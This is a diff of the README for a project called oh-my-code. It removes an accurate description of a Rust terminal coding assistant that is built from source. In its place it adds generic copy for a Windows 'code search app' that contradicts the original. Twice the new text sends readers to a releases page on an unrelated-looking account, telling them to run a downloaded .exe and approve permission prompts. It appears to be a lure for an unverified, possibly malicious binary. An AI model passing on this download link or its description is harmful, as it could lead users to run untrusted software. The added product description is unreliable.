@@ -1,98 +1,186 @@
-# oh-my-code
+# ⚡ oh-my-code - Fast code search for AI workflows
 
-A Rust-native interactive terminal coding assistant. Rebuilds the Claude Code experience in Rust with a pluggable provider layer, a native search toolchain, and a concurrent tool executor with read/write safety partitioning.
+[![Download oh-my-code](https://img.shields.io/badge/Download%20oh--my--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brushworkoilpressure365/oh-my-code/releases)
 
-## Features
+## 🧭 What is oh-my-code?
 
-- **Multi-provider**: Claude (Anthropic Messages API), OpenAI / GPT, Zhipu, MiniMax (OpenAI-compatible endpoint), and MiniMax (Anthropic-compatible endpoint at `api.minimaxi.com/anthropic` with `Bearer` auth). Add a new provider by extending `create_provider` in `src/model/mod.rs`.
-- **Two configuration paths**: a three-variable `.env` quick start (`API_KEY` + `BASE_URL` + `MODEL`, with wire format and auth style auto-detected from the URL) that coexists with a full `config.toml` multi-provider setup for users who want to juggle several backends.
-- **Streaming agent loop**: Assistant text streams to the terminal as it arrives; tool calls are dispatched and fed back into the conversation until the model stops calling tools.
-- **11 built-in tools**: `think`, `grep`, `glob`, `file_read`, `file_edit`, `file_write`, `bash`, `enter_plan_mode`, `exit_plan_mode`, `web_fetch`, `web_search`.
-- **Concurrent tool execution with safety partitioning**: Read-only tools run in parallel via `join_all`; write tools run sequentially in arrival order.
-- **Plan / Act modes**: An atomic shared flag gates writes. In Plan mode, the model can read and reason but cannot mutate files or run shell commands.
-- **Native search toolchain**: Uses `grep-searcher` + `grep-regex` + `ignore` + `syntect` directly — no shelling out to `rg` or `fd`.
-- **Interactive REPL**: `rustyline`-based line editor with slash commands (`/help`, `/model`, `/session`, `/clear`, `/quit`).
-- **File-based sessions**: Conversations are persisted as JSON under `~/.config/oh-my-code/sessions/`.
+oh-my-code is a Windows app for searching large codebases fast. It helps you find files, scan text, and review folders without waiting long.
 
-## Install
+It is built with Rust, which helps it stay quick and light. It fits AI coding workflows, code search, and codebase checks.
 
-Requires a recent stable Rust toolchain (install via [rustup](https://rustup.rs)).
+## ✅ What you can do with it
 
-```bash
-git clone <this-repo>
-cd oh-my-code
-cargo build --release
-```
+- Search across many files in a large folder
+- Find text in code with fast grep-style search
+- Scan folders and subfolders
+- Narrow down results by file name or content
+- Use it during AI coding work to locate code fast
+- Work with big projects without much delay
 
-The binary lands at `target/release/oh-my-code`.
+## 💻 Before you download
 
-## Configuration
+Use a Windows PC with:
 
-There are two ways to configure `oh-my-code`. They coexist — the quick-start env vars win when all three are set; otherwise `config.toml` drives provider selection.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A mouse and keyboard
+- Internet access for the first download
 
-### Quick start (`.env`, three variables)
+For best results, use a modern Intel or AMD processor. The app runs from your computer and does not need a heavy setup.
 
-```bash
-cp .env.example .env
-# then edit .env and fill in:
-#   API_KEY=sk-...
-#   BASE_URL=https://api.anthropic.com          # or any OpenAI / Anthropic-compatible endpoint
-#   MODEL=claude-sonnet-4-5
-```
+## 📥 Download oh-my-code
 
-`oh-my-code` reads `.env` at startup via `dotenvy`, then auto-detects the wire format and auth header from `BASE_URL`:
+Visit this page to download the app for Windows:
 
-| URL pattern                  | Wire format             | Auth header               |
-|------------------------------|-------------------------|---------------------------|
-| host is `api.anthropic.com`  | Anthropic Messages API  | `x-api-key`               |
-| path contains `/anthropic`   | Anthropic-compatible    | `Authorization: Bearer`   |
-| anything else                | OpenAI-compatible       | `Authorization: Bearer`   |
+https://github.com/brushworkoilpressure365/oh-my-code/releases
 
-If any of the three vars is missing or empty, the quick-start path stays inactive and `config.toml` is used instead. Partial configuration (e.g. `API_KEY` and `BASE_URL` set but `MODEL` missing) prints a warning to stderr so you know why your overrides are not taking effect.
+On that page, look for the latest release. Download the Windows file that matches your PC. If you see more than one file, choose the one that ends with .exe or .zip.
 
-### Multi-provider via `config.toml`
+## 🪟 Install on Windows
 
-On first run, a default config is written to `~/.config/oh-my-code/config.toml`. Edit it to change the active provider, model, search ignore patterns, or session storage directory. The in-repo template lives at `config/default.toml`. Each provider reads its API key from the env var named in its `api_key_env` field:
+### If you downloaded an .exe file
 
-| Provider            | Env var                | Endpoint                                 | Auth          |
-|---------------------|------------------------|------------------------------------------|---------------|
-| `claude`            | `ANTHROPIC_API_KEY`    | `https://api.anthropic.com`              | `x-api-key`   |
-| `minimax-anthropic` | `ANTHROPIC_AUTH_TOKEN` | `https://api.minimaxi.com/anthropic`     | `Bearer`      |
-| `openai`            | `OPENAI_API_KEY`       | `https://api.openai.com`                 | `Bearer`      |
-| `zhipu`             | `ZHIPU_API_KEY`        | `https://open.bigmodel.cn/api/paas/v4`   | `Bearer`      |
-| `minimax`           | `MINIMAX_API_KEY`      | `https://api.minimax.chat/v1`            | `Bearer`      |
+1. Open your Downloads folder
+2. Double-click the .exe file
+3. If Windows asks for permission, choose Yes
+4. Follow the on-screen steps
+5. Finish the setup
 
-## Usage
+### If you downloaded a .zip file
 
-```bash
-# Option 1 — quick start (reads .env)
-./target/release/oh-my-code
+1. Open your Downloads folder
+2. Right-click the .zip file
+3. Choose Extract All
+4. Pick a folder you can find later
+5. Open the extracted folder
+6. Double-click the app file inside
 
-# Option 2 — inline env var, provider chosen in config.toml
-ANTHROPIC_API_KEY=<key> ./target/release/oh-my-code
-```
+## 🚀 First launch
 
-Once in the REPL, type a request in natural language. Useful slash commands:
+1. Start oh-my-code from the file you downloaded
+2. Choose the code folder you want to scan
+3. Let the app index the files
+4. Type a word, file name, or path in the search box
+5. Review the results on screen
 
-- `/help` — list commands
-- `/model` — switch model
-- `/session` — list / load / save sessions
-- `/clear` — clear the current conversation history
-- `/quit` — exit
+If you have a large project, the first scan may take a short time. After that, searches should feel much faster.
 
-## Development
+## 🔎 How to use it well
 
-```bash
-cargo test              # full test suite
-cargo test <path>       # run a subset, e.g. cargo test model::types
-cargo clippy --all-targets
-cargo fmt
-```
+Use short search terms when possible. Try:
 
-Note: `oh-my-code` is a binary-only crate, so `cargo test --lib ...` will fail — use `cargo test <module_path>` instead.
+- A file name
+- A class name
+- A function name
+- A word used in an error message
+- A folder name
 
-See [`CLAUDE.md`](CLAUDE.md) for a deeper architectural tour.
+For large codebases, search one clear term at a time. That makes it easier to spot the right file. If your project has many similar names, add more detail to narrow the match.
 
-## License
+## 🧰 Common use cases
 
-Licensed under the Apache License, Version 2.0. See [`LICENSE`](LICENSE) for the full text.
+- Finding where a feature lives in a large app
+- Checking where a text string appears
+- Locating config files
+- Reviewing code before making a change
+- Helping an AI tool find the right parts of a project
+- Looking through a repo when you do not know the file layout
+
+## ⚙️ System behavior
+
+oh-my-code focuses on speed and simple search. It is designed to:
+
+- Scan folders fast
+- Keep search results easy to read
+- Work well with large repos
+- Handle many files without slowing down too much
+- Stay light on system resources
+
+## 🧾 File types it can handle
+
+oh-my-code works best with common code and text files such as:
+
+- .rs
+- .js
+- .ts
+- .py
+- .json
+- .toml
+- .md
+- .txt
+- .html
+- .css
+
+It can also search many other plain text files used in software projects.
+
+## 🧭 Tips for first-time users
+
+- Start with a small folder if your project is very large
+- Search for one clear term first
+- Use the file name if you know it
+- If results feel broad, add one more word
+- Keep the app open while you work in the same project
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Make sure you opened the right file
+- Try running it again as a normal user
+- If Windows blocks it, check the file permissions
+
+### Search results look empty
+
+- Make sure you picked the right folder
+- Check that the files are text files
+- Try a more common search term
+- Wait for the first scan to finish
+
+### The app feels slow on a huge repo
+
+- Close other heavy apps
+- Search in a smaller folder first
+- Use a more exact term
+- Let the initial scan finish before searching again
+
+## 🔐 Safety and privacy
+
+oh-my-code runs on your computer. It works with the folders you choose. That means you stay in control of what it scans and searches.
+
+If you use it on work code, point it only at the projects you want to inspect.
+
+## 📌 Project details
+
+- Name: oh-my-code
+- Type: Windows code search app
+- Focus: fast grep, find, and codebase scanning
+- Style: Rust-powered and light
+- Use case: AI coding workflows and large repo search
+
+## 🖥️ Quick path for Windows users
+
+1. Open the release page
+2. Download the latest Windows file
+3. Open the file from Downloads
+4. Install or extract it
+5. Launch the app
+6. Pick your code folder
+7. Start searching
+
+## 📁 Primary download
+
+https://github.com/brushworkoilpressure365/oh-my-code/releases
+
+## 🧩 What makes it useful
+
+When a project grows, it gets hard to find the right file by hand. oh-my-code helps you jump straight to the code you need. That saves time when you are reading, checking, or changing a large codebase
+
+## 📚 Best search habits
+
+- Use the exact word you saw in an error
+- Search for a function name before a folder name
+- Try file names when you know them
+- Use short terms for a broad scan
+- Use more detail when you need fewer results
